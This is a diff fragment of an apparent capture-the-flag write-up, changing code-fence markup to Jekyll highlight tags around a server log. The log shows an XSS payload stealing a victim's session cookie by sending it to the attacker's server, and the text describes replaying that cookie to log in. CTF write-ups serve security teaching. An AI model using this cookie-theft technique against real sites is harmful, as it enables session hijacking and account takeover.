@@ -72,10 +72,10 @@ We notice that the ticker says "WARNING: XSS detected! You have been reported."
 however, we still wait. Within 2 minutes, our javascript gets loaded, and we've
 stolen the user's session cookie:
 
-```
+{% highlight text %}
 192.168.8.6 - - [19/Nov/2015 17:58:01] "GET /r.js HTTP/1.1" 200 -
 192.168.8.6 - - [19/Nov/2015 17:58:01] "GET /url?session=eyJfZnJlc2giOnRydWUsIl9pZCI6eyIgYiI6IlltSmtNemxpT1RCbE56TTJNakkwTkRVMU0yTXpPVFZpTkRoa01tWm1Zek09In0sInVzZXJfaWQiOiI1In0.CS8EeQ.fNfERZulfSlUGpMSNEnsN2TBnzQ HTTP/1.1" 404 -
-```
+{% endhighlight %}
 
 We replace our session cookie with this one, and now we've logged in, reavealing
 the flag in the ticker:
